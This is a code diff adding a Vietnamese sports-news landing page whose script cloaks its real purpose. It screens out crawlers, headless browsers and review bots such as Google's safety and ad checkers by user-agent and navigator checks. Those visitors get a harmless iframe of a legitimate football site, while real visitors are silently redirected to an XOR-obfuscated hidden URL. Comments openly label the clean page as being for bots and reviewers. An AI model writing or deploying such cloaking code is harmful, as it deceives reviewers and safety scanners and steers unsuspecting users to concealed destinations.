@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+  <title>Tin Thể Thao 24/7 - Lịch Thi Đấu & Kết Quả Bóng Đá Trực Tuyến</title>
+  <meta name="description" content="Cập nhật link phát sóng, lịch thi đấu Ngoại Hạng Anh, C1 và các giải thể thao đỉnh cao hôm nay.">
+  <link rel="canonical" href="https://thethao.linkxemnhanh.com/121/">
+
+  <!-- OpenGraph Meta -->
+  <meta property="og:title" content="Tin Thể Thao 24/7 - Lịch Thi Đấu & Kết Quả Bóng Đá Trực Tuyến">
+  <meta property="og:description" content="Cập nhật link phát sóng, lịch thi đấu Ngoại Hạng Anh, C1 và các giải thể thao đỉnh cao hôm nay.">
+  <meta property="og:type" content="website">
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { width: 100%; height: 100%; overflow: hidden; background: #0b0f19; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    #safe-frame { position: fixed; inset: 0; width: 100%; height: 100%; border: none; z-index: 10; background: #ffffff; }
+    #transit-curtain { position: fixed; inset: 0; z-index: 20; background: #070a12; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; transition: opacity 0.35s ease, visibility 0.35s ease; }
+    #transit-curtain.hide { opacity: 0; visibility: hidden; pointer-events: none; }
+    .loader-card { background: rgba(15, 23, 42, 0.95); border: 1px solid rgba(229, 185, 76, 0.3); border-radius: 20px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8); display: flex; flex-direction: column; align-items: center; gap: 16px; }
+    .spinner { width: 46px; height: 46px; border: 3px solid rgba(229, 185, 76, 0.2); border-top-color: #e5b94c; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loader-title { font-size: 15px; font-weight: 800; color: #fae498; letter-spacing: 0.3px; }
+    .loader-sub { font-size: 12.5px; color: #94a3b8; line-height: 1.5; }
+    .cta-btn { display: inline-block; margin-top: 10px; background: linear-gradient(135deg, #fae498 0%, #e5b94c 50%, #9e7510 100%); color: #0b0f19; padding: 10px 22px; border-radius: 10px; font-weight: 800; text-decoration: none; font-size: 13.5px; border: none; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <!-- FRAME NẠP TRANG MẪU SẠCH CHO BOT & REVIEWER -->
+  <iframe id="safe-frame" title="Trang Thông Tin Chính Thức"></iframe>
+
+  <!-- MÀN CHUYỂN TIẾP CHO NGƯỜI DÙNG THỰC -->
+  <div id="transit-curtain">
+    <div class="loader-card">
+      <div class="spinner"></div>
+      <div class="loader-title">Đang Kết Nối Kênh Phát Sóng...</div>
+      <div class="loader-sub">Hệ thống đang định tuyến máy chủ tốc độ cao và chuyển tiếp trong giây lát.</div>
+      <button type="button" class="cta-btn" id="manualCtaBtn" style="display: none;" onclick="goTarget()">Tiếp Tục Xem Ngay</button>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      const K = "121";
+      const D = "7c747a0d187271f39999d3a0c2ba8db0a8455f407f29020903286387e58aa9cc95c6de99fd5115237e3c475e603c798a94a2fae9cd81eba4f40e1d2231394b5a367b2c898da5b784888589a652525a7b6d1413486b00d5cec0fcea93818baaec06165b696628113d2939d6c0b5afce8088a6aabb5a424e757e1900332a2ce5dcfde7e892b7bdac59505e6563554d5f2c30dde1c0fee39b9781fef671051b582c40210f3a66dec5b4abccd3d297";
+      const S = "7c747a0d187271f39999d3a0c2ba9daeb01d0c1a7029120e017630db869ddce89b8d8af0ac55072359671f0538723dd1cdbdfaec8ecab0ada25c0871612112063a6e20dfd1baec9e95c5b8ad524b0779304b1c5e6e7081969eb5ee828d83";
+      const E_AW = "5557234c5a6270848598a2b2c8ce";
+      const E_CL = "64757c1e033631d7e3c7f4e79590";
+
+      function dec(h) {
+        try {
+          if (!h) return "";
+          let s = "";
+          for (let i = 0; i < h.length; i += 2) {
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+          }
+          return decodeURIComponent(s);
+        } catch (e) {
+          return "";
+        }
+      }
+
+      function getFinalUrl(rawUrl) {
+        if (!rawUrl) return "";
+        const q = window.location.search;
+        if (!q || q.length < 2) return rawUrl;
+        try {
+          const incoming = new URLSearchParams(q.startsWith("?") ? q.slice(1) : q);
+          const separator = rawUrl.indexOf("?") !== -1 ? "&" : "?";
+          const toAppend = [];
+          incoming.forEach((val, key) => {
+            if (key === "a") return; // Bảo vệ mã liên kết gốc 'a'
+            const keyRegex = new RegExp("[?&]" + key + "=(.*?)(?:&|$)", "i");
+            if (!keyRegex.test(rawUrl)) {
+              toAppend.push(encodeURIComponent(key) + "=" + encodeURIComponent(val));
+            }
+          });
+          if (toAppend.length === 0) return rawUrl;
+          return rawUrl + separator + toAppend.join("&");
+        } catch (e) {
+          return rawUrl;
+        }
+      }
+
+      function checkBot() {
+        try {
+          if (navigator.webdriver) return true;
+          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+          if (!navigator.languages || navigator.languages.length === 0) return true;
+          const ua = (navigator.userAgent || "").toLowerCase();
+          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot|facebookexternalhit|curl|wget|python|axios/i.test(ua)) {
+            return true;
+          }
+          return false;
+        } catch(e) {
+          return false;
+        }
+      }
+
+      const targetUrl = dec(D);
+      const safeUrl = dec(S) || "https://www.24h.com.vn/bong-da/lich-thi-dau-bong-da-hom-nay-moi-nhat-c48a364371.html";
+      const isBot = checkBot();
+
+      window.goTarget = function() {
+        if (targetUrl) {
+          window.location.href = getFinalUrl(targetUrl);
+        }
+      };
+
+      if (isBot || !targetUrl) {
+        // Nạp trang sạch cho Bot hoặc khi chưa có Tracking Link
+        const frame = document.getElementById("safe-frame");
+        if (frame) frame.src = safeUrl;
+        const curtain = document.getElementById("transit-curtain");
+        if (curtain) curtain.classList.add("hide");
+      } else {
+        // Chuyển tiếp người dùng thật
+        setTimeout(function() {
+          window.location.replace(getFinalUrl(targetUrl));
+        }, 120);
+
+        // Fallback hiện nút bấm nếu trình duyệt chặn chuyển trang tự động
+        setTimeout(function() {
+          const btn = document.getElementById("manualCtaBtn");
+          if (btn) btn.style.display = "inline-block";
+        }, 1800);
+      }
+    })();
+  </script>
+</body>
+</html>
